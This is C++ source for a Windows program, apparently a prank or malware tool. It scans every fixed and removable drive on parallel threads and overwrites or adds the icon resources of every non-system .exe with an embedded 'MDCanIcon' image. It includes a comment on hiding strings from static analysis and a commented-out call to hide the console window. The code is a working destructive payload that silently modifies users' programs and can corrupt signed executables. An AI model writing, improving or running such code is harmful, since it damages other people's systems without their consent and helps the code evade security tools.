/* TODO: 
   - Rename variables to appropriate designations.
   - Get the locale language of the machine and update 1812,1813 error (line 136) to use it instead of default English 1033.
   + Implement threading to work on multiple drives at once and possibly start from top-bottom of drive data to meet in middle.
*/ 

#include <chrono>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <map>
#include <thread>
#include <vector>
#include <functional>

#include <Windows.h>
#include <Sfc.h>
#include "resource.h"

#pragma comment(lib, "sfc")

std::vector<std::wstring> GetDriveLetters() 
{
    wchar_t diskLetter = 67;  // Start with 'C'
    wchar_t driveSlash[] = {':', '\\', 0};
    
    std::vector<std::wstring> foundDrives;
    std::wstring concatDrivePath;
    UINT drivetype = 0;

    for (short i = 1; i != 25; i++) 
    {
        concatDrivePath += diskLetter;
        concatDrivePath += driveSlash; // Effectively "C:\", then next iteration "D:\", etc.

        if (!std::filesystem::exists(concatDrivePath))
        {
            concatDrivePath = L"";
            continue;
        }

        drivetype = ::GetDriveTypeW(concatDrivePath.c_str());
        /* 
            https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getdrivetypew
            
            DRIVE_UNKNOWN
            0	The drive type cannot be determined.

            DRIVE_NO_ROOT_DIR
            1	The root path is invalid; for example, there is no volume mounted at the specified path.

            DRIVE_REMOVABLE
            2	The drive has removable media; for example, a floppy drive, thumb drive, or flash card reader.

            DRIVE_FIXED
            3	The drive has fixed media; for example, a hard disk drive or flash drive.

            DRIVE_REMOTE
            4	The drive is a remote (network) drive.

            DRIVE_CDROM
            5	The drive is a CD-ROM drive.

            DRIVE_RAMDISK
            6 	The drive is a RAM disk. 
        */
            
        if (drivetype != 5 && drivetype != 0) 
        {
            foundDrives.push_back(concatDrivePath);
        }
        
        concatDrivePath = L"";
        diskLetter++;
    }
    return foundDrives;
}

std::map<LPCWSTR, WORD> resNames; // Temporarily holds found resource names and locale languages for each iteration.

BOOL CALLBACK EnumIconLang(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam) 
{
    if (lpType == NULL && lpName == NULL) 
    {
        return false;
    }

    resNames.emplace(lpName, wLanguage);
    return true;
}

BOOL CALLBACK EnumIconNames(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam)
{
    if (lpType == NULL && lpName == NULL)
    {
        return false;
    }

    ::EnumResourceLanguagesExW(hModule, lpType, lpName, EnumIconLang, lParam, 0, 0);

    return true;
}

std::function<void()> ReplaceEXEIconResources(std::filesystem::path pathStart, LPVOID lpMDcanIcon, DWORD dwMDcanIconSize)
{
    // Using a char array instead of string in an attempt to deter static analysis string identification.
    wchar_t exeExt[] = {'.', 'e', 'x', 'e', 0};

    for (auto itr_path : std::filesystem::recursive_directory_iterator(pathStart, std::filesystem::directory_options::skip_permission_denied)) 
    {
        // If current file is not .EXE, skip to next file.
        if (!(itr_path.path().extension() == exeExt))
        {
            continue;
        }

        const std::wstring currentPath = itr_path.path().wstring(); // Change from utf-8 to utf-16 'wide'string

        // Check if current file is a system protected file. If so, skip.
        if (::SfcIsFileProtected(NULL, currentPath.c_str())) 
        {
            continue;
        }

        // Import EXE as a data image, no execution and locked memory until released.
        HMODULE hmTheExe = ::LoadLibraryExW(currentPath.c_str(), NULL, (LOAD_LIBRARY_AS_IMAGE_RESOURCE | LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE));
        if (hmTheExe == NULL) 
        {
            resNames.clear();
            continue;
        }

        if (!::EnumResourceNamesExW(hmTheExe, MAKEINTRESOURCEW(RT_ICON), EnumIconNames, NULL, 0, 0)) 
        {
            // Handles a couple situations where no resources are found inside the executable.
            switch (::GetLastError()) 
            {
                case 1812:  // "The specified image file did not contain a resource section."
                case 1813:  // "The specified resource type cannot be found in the image file."
                {
                    // std::wcout << currentPath << "\n" << "No icon resources detected, attempting to add\n";
                    if (!::FreeLibrary(hmTheExe)) 
                    {
                        resNames.clear();
                        continue;
                    }
                    
                    HANDLE hUpdateResource = ::BeginUpdateResourceW(currentPath.c_str(), false);
                    if (hUpdateResource == NULL) 
                    {
                        resNames.clear();
                        continue;
                    }
                    
                    // 101 is the resource ID of MDCanIcon.ico
                    // 1033 is the locale language ID for English
                    // Icons must be part of an Icon_Group
                    if (!::UpdateResourceW(hUpdateResource, MAKEINTRESOURCE(RT_GROUP_ICON), L"101", 1033, lpMDcanIcon, dwMDcanIconSize)) 
                    {
                        // std::wcout << ::GetLastError() << " Could not update group resource.\n";
                        resNames.clear();
                        continue;
                    }
                    
                    if (!::UpdateResourceW(hUpdateResource, MAKEINTRESOURCE(RT_ICON), NULL, NULL, lpMDcanIcon, dwMDcanIconSize)) 
                    {
                        // std::wcout << ::GetLastError() << " Could not update icon resource.\n";
                        resNames.clear();
                        continue;
                    }
                    
                    if (!::EndUpdateResourceW(hUpdateResource, false)) 
                    {
                        // std::wcout << ::GetLastError() << " Could not end update resource.\n";
                        resNames.clear();
                        continue;
                    }
                    
                    resNames.clear();
                    break;
                }
                    
                default:
                    break;
            }
            
            resNames.clear();
            continue;
        }
       
        // Might as well release the data image so we're not eating memory.
        if (!::FreeLibrary(hmTheExe)) 
        {
            resNames.clear();
            continue;
        }

        HANDLE hUpdateResource = ::BeginUpdateResourceW(currentPath.c_str(), false);
        if (hUpdateResource == NULL) 
        {
            resNames.clear();
            continue;
        }

        // For each icon resource found in the executable, replace it.
        std::map<LPCWSTR, WORD>::iterator itr;
        for (itr = resNames.begin(); itr != resNames.end(); itr++) 
        {
            if (!::UpdateResourceW(hUpdateResource, MAKEINTRESOURCE(RT_ICON), itr->first, itr->second, lpMDcanIcon, dwMDcanIconSize)) 
            {
                resNames.clear();
                continue;
            }
        }

        if (!::EndUpdateResourceW(hUpdateResource, false)) 
        {
            resNames.clear();
            continue;
        }

        resNames.clear();
    }
    return 0;
}

// void ReplaceSysIcons()
//{
//    // Get paths to
//    // C:\Windows\SystemResources\imageres.dll.mun
//    // C:\Windows\SystemResources\shell32.dll.mun
//    // ...
//}

int main() {
    
    //::FreeConsole(); // Hide console from GUI.

   // Load the MDCanIcon.ico into memory
    HRSRC hresMDCanIcon = ::FindResourceExW(NULL, MAKEINTRESOURCE(RT_ICON), MAKEINTRESOURCE(1), 0);
    if (hresMDCanIcon == NULL) 
    {
        return -1;
    }

    HGLOBAL hgMDcanIcon = ::LoadResource(NULL, hresMDCanIcon);
    if (hgMDcanIcon == NULL) 
    {
        return -1;
    }

    LPVOID lpMDcanIcon = ::LockResource(hgMDcanIcon);
    if (lpMDcanIcon == NULL) 
    {
        return -1;
    }

    DWORD dwMDcanIconSize = SizeofResource(NULL, hresMDCanIcon);
    if (dwMDcanIconSize == 0) 
    {
        return -1;
    }

    std::vector<std::wstring> drives = GetDriveLetters();
    std::vector<std::thread> threadPool;

    for (auto& drive : drives) 
    {
        std::filesystem::path drivepath = drive.c_str();
        threadPool.push_back(std::thread(ReplaceEXEIconResources, drivepath, lpMDcanIcon, dwMDcanIconSize));
    }

    for (auto& thread : threadPool)
    {
        thread.join();
    }

    UnlockResource(lpMDcanIcon);
    ::FreeResource(hgMDcanIcon);
    std::wcout << std::endl;  // Empty OUT buffer to feel good.

    return 0;
}